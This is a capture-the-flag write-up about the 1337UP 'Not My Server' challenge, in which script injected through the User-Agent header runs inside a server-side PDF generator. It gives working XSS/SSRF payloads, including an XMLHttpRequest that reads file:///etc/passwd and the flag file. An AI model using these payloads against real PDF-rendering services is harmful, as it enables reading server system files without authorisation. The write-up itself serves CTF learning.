---
title: Not My Server
author: 0xRaminf0sec
date: 2022-03-13
categories: [1337UP]
tags: [ssrf]
---


>chall : Not my server 

>Description :     Wait, you're an admin? Well, what can you do now?

Well, It was the continuation of Getting admin access challenge.I logged in as admin and i noticed there was an functionality generates the PDF which contains the previous logins username,Date and time , User-Agent strings.

![Screenshot](https://raw.githubusercontent.com/Ramalingasamy012/WebCTF-writeups/main/screenshots/notmy1.png
 "Screenshot")

I crafted a html tags in User-agent strings while logging in and it reflects in the PDF and it also vulnerable to SSRF !!.

![Screenshot](https://raw.githubusercontent.com/Ramalingasamy012/WebCTF-writeups/main/screenshots/notmy2.png
 "Screenshot")
 
 I want to know which protocol they used to save files and i used this payload to print file location 
 
 ```
 <script>document.write(document.location.href)</script>
 
 Location : file:///tmp/wktemp-a5227fe0-e5d3-4ecb-a055-1f38964c02e2.html
 ```
 
 They used file:/// protocal and i tried iframe to render the /etc/passwd file but it failed.I used XHR requests but it also failed
 
 ```
 <script>exfil = new XMLHttpRequest();exfil.open("GET","file:///etc/passwd"); exfil.send();exfil.onload = function(){document.write(this.responseText);} exfil.onerror = function(){document.write('failed!')}</script>
 ```
 
 My teammate 0xGodson helped me to solve this chall.He sent a payload which was working like  a king!!
 
 ```
 <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
 ```

And I can able to read the /etc/passwd file!!!

![Screenshot](https://raw.githubusercontent.com/Ramalingasamy012/WebCTF-writeups/main/screenshots/notmy3.png
 "Screenshot")
 
 Finally, The flag is in file:///flag
 
 ```
 FLAG{SSRF_IS_AWESOME_UDKSO}
 ```


    